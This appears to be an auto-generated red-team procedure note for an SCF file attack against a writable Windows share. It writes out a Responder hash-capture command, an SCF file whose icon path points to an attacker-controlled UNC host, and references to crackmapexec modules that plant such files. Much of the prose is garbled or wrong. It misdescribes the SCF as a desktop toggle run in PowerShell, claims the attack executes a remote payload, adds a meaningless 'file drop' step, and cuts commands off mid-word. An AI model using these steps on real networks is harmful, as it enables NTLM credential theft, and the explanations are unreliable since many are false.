---
id: 3576037e-9933-4bf9-80a0-e3c01d6f19bb
name: SCF and URL File Attack Against Writable Share Procedure
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:03.389902+00:00'
updated_at: '2023-04-10T20:26:21.317746+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[External Remote Services|T1133 - External Remote Services]]'
- '[[Spearphishing Attachment|T1193 - Spearphishing Attachment]]'
tags:
- '[[Active Directory Attacks]]'
- '[[SCF and URL file attack against writeable share]]'
- '[[SCF Files]]'
commands:
- '[[Responder WRF with LM enabled on eth0 interface]]'
- '[[Setting Shell Command]]'
- '[[Setting Taskbar Command]]'
---

# SCF and URL File Attack Against Writable Share Procedure

## Summary

The SCF and URL file attack against writable share procedure is a method of gaining initial access to a target network by exploiting the way Windows Explorer handles .scf files. An attacker can create a specially crafted .scf file that, when opened, will execute a payload hosted on a remote server.

## Description

# Description

The SCF and URL file attack against writable share procedure is a method of gaining initial access to a target network by exploiting the way Windows Explorer handles .scf files. An attacker can create a specially crafted .scf file that, when opened, will execute a payload hosted on a remote server. This procedure can be used to deliver a variety of payloads, including malware, backdoors, and keyloggers. Once the payload is executed, the attacker can gain a foothold in the target network and begin moving laterally.

## Requirements

1. Access to a writable share

1. Ability to create a specially crafted .scf file

1. Ability to host a payload on a remote server

## Defense

1. Disable the WebClient service on all systems to prevent the exploitation of .scf files

1. Implement a robust patch management program to ensure all systems are up-to-date with the latest security patches

1. Monitor network traffic for suspicious SMB and HTTP traffic

## Objectives

1. Gain initial access to the target network

1. Execute a payload on the target system

# Instructions

1. The 'file drop' command is used to drop a file or a set of files at a specific location on the system. The files could be dropped on a local or remote system depending on the access privileges. The command can be used to transfer files between systems or to a remote server.

**Code**: [[@something.scf]]

> The argument '@something.scf' represents the file or set of files that are to be dropped. The argument should be replaced with the actual file name or the path of the files that need to be dropped. The command can be executed with administrator or root privileges depending on the system configuration. The command can be used with additional arguments to specify the destination path or the user account to be used for the file transfer.

2. Run the above command in the terminal to start listening for SMB and HTTP traffic on interface eth0.

**Code**: [[responder -wrf --lm -v -I eth0]]

> -w: Enable WPAD rogue proxy server
-r: Enable SMB and HTTP NTLMv1-2 authentication capture
-f: Force WPAD authentication over HTTP
--lm: Enable LM hashing for NTLMv1 authentication
-v: Enable verbose output
-I: Specify the interface to listen on

**Command** ([[Responder WRF with LM enabled on eth0 interface]]):

```bash
responder -wrf --lm -v -I eth0
```

3. This command allows you to toggle the desktop icon on and off. 
To use this command, simply copy and paste the provided code into a PowerShell script file and run it. 

**Code**: [[[Shell]
Command=2
IconFile=\\10.10.10.10\Share\tes]]

> The Command=2 parameter in the [Shell] section specifies that the command will be a toggle. 
The IconFile parameter in the [Shell] section specifies the path to the icon file that will be used for the desktop icon. 
The Command=ToggleDesktop parameter in the [Taskbar] section specifies that the command will toggle the desktop icon on and off.

**Command** ([[Setting Shell Command]]):

```bash
[Shell]
Command=2
IconFile=\\10.10.10.10\Share\test.ico

```

**Command** ([[Setting Taskbar Command]]):

```bash
[Taskbar]
Command=ToggleDesktop
```

4. This command can be used to enumerate SMB shares and execute payloads on a target machine. The `-u` flag is used to specify the username and the `-p` flag is used to specify the password. The `-M` flag is used to specify the payload to be executed on the target machine. The `-o` flag is used to specify additional options for the payload. In this case, `NAME` is set to `WORK`, `SERVER` is set to `IP_RESPONDER`, and `CLEANUP` is specified for one of the payloads. The `#scf` and `#lnk` at the end of the first and second commands respectively are comments that specify the file extension of the payload. 

**Code**: [[crackmapexec smb 10.10.10.10 -u username -p passwo]]

> This command is useful for penetration testing and can help identify vulnerabilities in a target system. The `crackmapexec` tool is used to enumerate SMB shares and the `-M` flag is used to execute payloads on the target machine. The payloads specified in this command are `scuffy` and `slinky`. The `NAME` and `SERVER` options are used to specify the name of the payload and the IP address of the responder respectively. The `CLEANUP` option is used to clean up the payload after execution. It is important to note that this command should only be used on systems that you have permission to test.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Initial Access|TA0001 - Initial Access]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[External Remote Services|T1133 - External Remote Services]]
- [[Spearphishing Attachment|T1193 - Spearphishing Attachment]]

## Commands Used

- [[Responder WRF with LM enabled on eth0 interface]]
- [[Setting Shell Command]]
- [[Setting Taskbar Command]]

## Tags

- [[Active Directory Attacks]]
- [[SCF and URL file attack against writeable share]]
- [[SCF Files]]
